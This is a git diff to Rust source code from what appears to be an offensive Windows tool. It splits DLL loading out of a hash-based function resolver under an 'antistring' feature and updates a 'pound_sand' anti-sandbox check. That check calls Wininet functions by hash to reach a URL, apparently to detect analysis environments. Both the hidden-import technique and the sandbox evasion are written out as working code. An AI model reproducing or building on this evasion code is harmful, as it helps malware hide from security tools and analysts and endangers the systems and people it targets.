@@ -94,17 +94,9 @@ fn equalize_slice_len<T: std::clone::Clone>(slice_one: &[T], slice_two: &[T]) ->
 */
 
 #[cfg(all(windows, feature = "antistring"))]
-pub fn find_function_address(dll: &str, name_hash: u64) -> Result<*const (), Box<dyn Error>> {
-    // Call LoadLibraryA on a DLL to get its base address
-    let lib_filename = PCSTR::from_raw(format!("{dll}\0").as_mut_ptr());
-    let library_base = match unsafe { LoadLibraryA(lib_filename) } {
-        Ok(value) => value,
-        Err(_) => panic!("Could not load {lib_filename:?}"),
-    };
-    let library_base_usize = library_base.0 as usize;
-
+pub fn find_function_address(library_base_usize: usize, name_hash: u64) -> Result<*const (), Box<dyn Error>> {
     // Get a pointer to the DOS header
-    let dos_header: *const IMAGE_DOS_HEADER = library_base.0 as *const IMAGE_DOS_HEADER;
+    let dos_header: *const IMAGE_DOS_HEADER = library_base_usize as *const IMAGE_DOS_HEADER;
 
     // Calculate the address of the image headers
     let image_headers: *const IMAGE_NT_HEADERS64 = unsafe {
@@ -170,7 +162,23 @@ pub fn find_function_address(dll: &str, name_hash: u64) -> Result<*const (), Box
             return Ok(function_address);
         }
     }
-    Err(format!("Could not find the function '{name_hash:x}' in '{dll}'").into())
+    Err(format!("Could not find the function '{name_hash:x}'").into())
+}
+
+/*
+    Find Win32 function implementation - finds the memory location of a Win32 function in its DLL so it can be called directly
+*/
+
+#[cfg(all(windows, feature = "antistring"))]
+pub fn find_library_address(dll: &str) -> Result<usize, Box<dyn Error>> {
+    // Call LoadLibraryA on a DLL to get its base address
+    let lib_filename = PCSTR::from_raw(format!("{dll}\0").as_mut_ptr());
+    let library_base = match unsafe { LoadLibraryA(lib_filename) } {
+        Ok(value) => value,
+        Err(_) => panic!("Could not load {lib_filename:?}"),
+    };
+    
+    Ok(library_base.0 as usize)
 }
 
 /*
@@ -214,8 +222,11 @@ pub fn pound_sand() -> bool {
 
 #[cfg(all(windows, feature = "antisand", feature = "antistring"))]
 pub fn pound_sand() -> bool {
+    // Get location of Wininet.dll
+    let wininet = find_library_address("Wininet").unwrap();
+
     // See line 90
-    let function = find_function_address("Wininet", 0x4b98c7b42f5ce34f).unwrap();
+    let function = find_function_address(wininet, 0x4b98c7b42f5ce34f).unwrap();
     let lpsz_agent = PCSTR::from_raw(String::from("Name in user-agent\0").as_mut_ptr());
     let internet_handle = unsafe {
         mem::transmute::<*const (), fn(PCSTR, i32, PCSTR, PCSTR, i32) -> *mut c_void>(function)(
@@ -239,7 +250,7 @@ pub fn pound_sand() -> bool {
     full_link.push_str(&link_end);
 
     // See line 111
-    let function = find_function_address("Wininet", 0x275e2d4fe536ed19).unwrap();
+    let function = find_function_address(wininet, 0x275e2d4fe536ed19).unwrap();
     let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
     let website = unsafe {
         mem::transmute::<*const (), fn(*mut c_void, PCSTR, &[u8], u32, usize) -> *mut c_void>(
